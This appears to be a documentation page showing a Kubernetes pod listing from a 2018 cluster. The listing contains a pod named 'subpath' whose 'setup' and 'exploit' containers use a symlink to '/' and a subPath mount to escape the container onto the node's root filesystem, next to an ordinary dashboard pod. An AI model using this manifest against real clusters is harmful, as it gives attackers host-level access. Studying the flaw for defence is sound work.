[Back](/docs/direct-controller.md)

```
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "subpath",
        "namespace": "default",
        "selfLink": "/api/v1/namespaces/default/pods/subpath",
        "uid": "3fb02fa6-2e9e-11e8-9d04-06d7638bd978",
        "resourceVersion": "418027",
        "creationTimestamp": "2018-03-23T13:29:44Z",
        "annotations": {
          "kubernetes.io/config.seen": "2018-03-23T13:29:44.306996903Z",
          "kubernetes.io/config.source": "api"
        }
      },
      "spec": {
        "volumes": [
          {
            "name": "escape-volume",
            "emptyDir": {}
          },
          {
            "name": "status-volume",
            "emptyDir": {}
          }
        ],
        "containers": [
          {
            "name": "setup",
            "image": "nginx:latest",
            "command": [
              "/bin/bash"
            ],
            "args": [
              "-c",
              "cd /rootfs && rm -rf hostetc && ln -s / /rootfs/host && touch /status/done && sleep infinity"
            ],
            "resources": {},
            "volumeMounts": [
              {
                "name": "escape-volume",
                "mountPath": "/rootfs"
              },
              {
                "name": "status-volume",
                "mountPath": "/status"
              }
            ],
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "Always",
            "securityContext": {
              "capabilities": {
                "drop": [
                  "CHOWN",
                  "DAC_OVERRIDE",
                  "FOWNER",
                  "FSETID",
                  "KILL",
                  "SETGID",
                  "SETUID",
                  "SETPCAP",
                  "NET_BIND_SERVICE",
                  "NET_ADMIN",
                  "NET_RAW",
                  "MKNOD",
                  "AUDIT_WRITE"
                ]
              },
              "allowPrivilegeEscalation": false
            }
          },
          {
            "name": "exploit",
            "image": "nginx:latest",
            "command": [
              "/bin/bash"
            ],
            "args": [
              "-c",
              "if [[ -f /status/done ]];then sleep infinity; else sleep 1; fi"
            ],
            "resources": {},
            "volumeMounts": [
              {
                "name": "escape-volume",
                "mountPath": "/rootfs",
                "subPath": "host"
              },
              {
                "name": "status-volume",
                "mountPath": "/status"
              }
            ],
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "Always",
            "securityContext": {
              "capabilities": {
                "drop": [
                  "CHOWN",
                  "DAC_OVERRIDE",
                  "FOWNER",
                  "FSETID",
                  "KILL",
                  "SETGID",
                  "SETUID",
                  "SETPCAP",
                  "NET_BIND_SERVICE",
                  "NET_ADMIN",
                  "NET_RAW",
                  "MKNOD",
                  "AUDIT_WRITE"
                ]
              },
              "allowPrivilegeEscalation": false
            }
          }
        ],
        "restartPolicy": "Always",
        "terminationGracePeriodSeconds": 30,
        "dnsPolicy": "ClusterFirst",
        "nodeName": "ip-10-1-0-10",
        "securityContext": {},
        "schedulerName": "default-scheduler"
      },
      "status": {
        "phase": "Running",
        "conditions": [
          {
            "type": "Initialized",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2018-03-23T13:29:44Z"
          },
          {
            "type": "Ready",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2018-03-23T13:29:46Z"
          },
          {
            "type": "PodScheduled",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2018-03-23T13:29:44Z"
          }
        ],
        "hostIP": "10.1.0.10",
        "podIP": "10.2.0.39",
        "startTime": "2018-03-23T13:29:44Z",
        "containerStatuses": [
          {
            "name": "exploit",
            "state": {
              "running": {
                "startedAt": "2018-03-23T13:29:45Z"
              }
            },
            "lastState": {},
            "ready": true,
            "restartCount": 0,
            "image": "nginx:latest",
            "imageID": "docker-pullable://nginx@sha256:c4ee0ecb376636258447e1d8effb56c09c75fe7acf756bf7c13efadf38aa0aca",
            "containerID": "docker://3f055bd81ff8d971d8392704efc3d8194895373bca1378194acc57e371626e72"
          },
          {
            "name": "setup",
            "state": {
              "running": {
                "startedAt": "2018-03-23T13:29:45Z"
              }
            },
            "lastState": {},
            "ready": true,
            "restartCount": 0,
            "image": "nginx:latest",
            "imageID": "docker-pullable://nginx@sha256:c4ee0ecb376636258447e1d8effb56c09c75fe7acf756bf7c13efadf38aa0aca",
            "containerID": "docker://294d653161ac9e387b173c2cead5033c1e51800e6cea28116979e3442944783f"
          }
        ],
        "qosClass": "BestEffort"
      }
    },
    {
      "metadata": {
        "name": "kubernetes-dashboard-5b575fd4c-77fqr",
        "generateName": "kubernetes-dashboard-5b575fd4c-",
        "namespace": "kube-system",
        "selfLink": "/api/v1/namespaces/kube-system/pods/kubernetes-dashboard-5b575fd4c-77fqr",
        "uid": "d60f089f-0a85-11e8-9462-06d7638bd978",
        "resourceVersion": "1813",
        "creationTimestamp": "2018-02-05T15:04:17Z",
        "labels": {
          "k8s-addon": "kubernetes-dashboard.addons.k8s.io",
          "k8s-app": "kubernetes-dashboard",
          "kubernetes.io/cluster-service": "true",
          "pod-template-hash": "161319807",
          "version": "v1.6.3"
        },
        "annotations": {
          "kubernetes.io/config.seen": "2018-03-17T14:35:59.815512435Z",
          "kubernetes.io/config.source": "api",
          "scheduler.alpha.kubernetes.io/critical-pod": "",
          "scheduler.alpha.kubernetes.io/tolerations": "[{\"key\":\"CriticalAddonsOnly\", \"operator\":\"Exists\"}]"
        },
        "ownerReferences": [
          {
            "apiVersion": "extensions/v1beta1",
            "kind": "ReplicaSet",
            "name": "kubernetes-dashboard-5b575fd4c",
            "uid": "d60dcfa3-0a85-11e8-9462-06d7638bd978",
            "controller": true,
            "blockOwnerDeletion": true
          }
        ]
      },
      "spec": {
        "containers": [
          {
            "name": "kubernetes-dashboard",
            "image": "gcr.io/google_containers/kubernetes-dashboard-amd64:v1.6.3",
            "args": [
              "--apiserver-host=http://10.1.0.10:8080"
            ],
            "ports": [
              {
                "containerPort": 9090,
                "protocol": "TCP"
              }
            ],
            "resources": {
              "limits": {
                "cpu": "100m",
                "memory": "50Mi"
              },
              "requests": {
                "cpu": "100m",
                "memory": "50Mi"
              }
            },
            "livenessProbe": {
              "httpGet": {
                "path": "/",
                "port": 9090,
                "scheme": "HTTP"
              },
              "initialDelaySeconds": 30,
              "timeoutSeconds": 30,
              "periodSeconds": 10,
              "successThreshold": 1,
              "failureThreshold": 3
            },
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "IfNotPresent"
          }
        ],
        "restartPolicy": "Always",
        "terminationGracePeriodSeconds": 30,
        "dnsPolicy": "ClusterFirst",
        "serviceAccountName": "kubernetes-dashboard",
        "serviceAccount": "kubernetes-dashboard",
        "nodeName": "ip-10-1-0-10",
        "securityContext": {},
        "schedulerName": "default-scheduler",
        "tolerations": [
          {
            "key": "node-role.kubernetes.io/master",
            "effect": "NoSchedule"
          }
        ]
      },
      "status": {
        "phase": "Running",
        "conditions": [
          {
            "type": "Initialized",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2018-02-05T15:04:17Z"
          },
          {
            "type": "Ready",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2018-03-17T14:36:01Z"
          },
          {
            "type": "PodScheduled",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2018-02-05T15:04:17Z"
          }
        ],
        "hostIP": "10.1.0.10",
        "podIP": "10.2.0.4",
        "startTime": "2018-02-05T15:04:17Z",
        "containerStatuses": [
          {
            "name": "kubernetes-dashboard",
            "state": {
              "running": {
                "startedAt": "2018-03-17T14:36:01Z"
              }
            },
            "lastState": {
              "terminated": {
                "exitCode": 2,
                "reason": "Error",
                "startedAt": "2018-02-05T15:08:16Z",
                "finishedAt": "2018-02-05T15:32:50Z",
                "containerID": "docker://15d44b7d87a258a0d18c38ec64f4129169d5ae568d1b3384a22e09256d7a0483"
              }
            },
            "ready": true,
            "restartCount": 3,
            "image": "gcr.io/google_containers/kubernetes-dashboard-amd64:v1.6.3",
            "imageID": "docker-pullable://gcr.io/google_containers/kubernetes-dashboard-amd64@sha256:2c4421ed80358a0ee97b44357b6cd6dc09be6ccc27dfe9d50c9bfc39a760e5fe",
            "containerID": "docker://a3c7cd6d8e0ebf603b431604ab7a1844f8ed0b651b231b10849010fd7cf37b17"
          }
        ],
        "qosClass": "Guaranteed"
      }
    }
  ]
}

```

